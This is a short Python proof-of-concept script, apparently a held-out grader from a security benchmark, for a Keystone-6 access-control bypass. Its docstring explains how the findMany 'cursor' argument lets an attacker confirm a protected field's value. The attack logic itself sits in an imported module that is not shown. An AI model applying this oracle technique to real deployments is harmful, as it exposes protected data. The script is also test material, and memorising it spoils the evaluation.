#!/usr/bin/env python3
"""
HELD-OUT bypass PoC -- CVE-2026-33326 (@keystone-6/core isFilterable bypass via
findMany `cursor`). Incomplete fix of CVE-2025-46720.

NEVER exposed to the system-under-test. The residual value-oracle: the CVE-2025-46720
patch guarded the `where` parameter in update/delete (and findMany filtering), but
findMany's `cursor` argument accepts the same SecretWhereUniqueInput type and was NOT
run through checkFilterOrderAccess. So `secrets(cursor:{code:<guess>})` confirms the
protected value on V1 (6.5.1) and is BLOCKED on V2 (6.5.2), which adds
`if (cursor) await checkFilterOrderAccess([...traverse(list, cursor)], ...)`.

Usage: bypass_poc.py <base_url> <flag>
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from oracle import probe_cursor

if __name__ == "__main__":
    base, flag = sys.argv[1], sys.argv[2]
    verdict, detail = probe_cursor(base, flag)
    print("[residual CVE-2026-33326 findMany cursor oracle] verdict=%s" % verdict)
    print(detail)
    sys.exit(0 if verdict == "REACHED" else 1)
